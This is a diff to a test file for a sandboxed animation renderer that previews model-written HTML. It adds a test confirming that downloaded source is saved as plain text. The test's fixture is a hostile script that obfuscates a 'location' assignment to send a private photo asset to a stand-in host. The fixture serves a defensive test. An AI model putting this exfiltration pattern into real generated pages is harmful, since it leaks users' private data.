@@ -1,11 +1,20 @@
 import { runInNewContext } from 'node:vm';
 import { describe, expect, it } from 'vitest';
-import { buildPreviewDocument, isPreviewMessage, videoDimensions } from '../src/lib/renderer';
+import { buildPreviewDocument, createAnimationSourceDownload, isPreviewMessage, videoDimensions } from '../src/lib/renderer';
 
 const html = '<html><head></head><body><canvas id="stage" width="1920" height="1080"></canvas><script>window.DURATION=10;window.seek=function(t){window.lastTime=t};</script></body></html>';
 const channel = 'test-channel-123';
 
 describe('isolated animation renderer', () => {
+  it('downloads model HTML as non-executable text without injecting private assets or a playback runtime', async () => {
+    const source = '<canvas id="stage"></canvas><script>window.seek=()=>{};const alias=globalThis;alias["loc"+"ation"]="https://example.invalid/?data="+encodeURIComponent(window.ASSETS.photo);</script>';
+    const download = createAnimationSourceDownload(source);
+    expect(download.filename).toBe('claude-motion-video-source.txt');
+    expect(download.blob.type).toBe('text/plain;charset=utf-8');
+    expect(await download.blob.text()).toBe(source);
+    expect(await download.blob.text()).not.toContain('data:image/');
+    expect(await download.blob.text()).not.toContain('cmv:ready');
+  });
   it('places network-denying CSP before any model content and never accepts remote asset URLs', () => {
     const doc = buildPreviewDocument(html, { a: 'data:image/png;base64,aGVsbG8=' }, channel);
     const csp = doc.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)"/)?.[1];
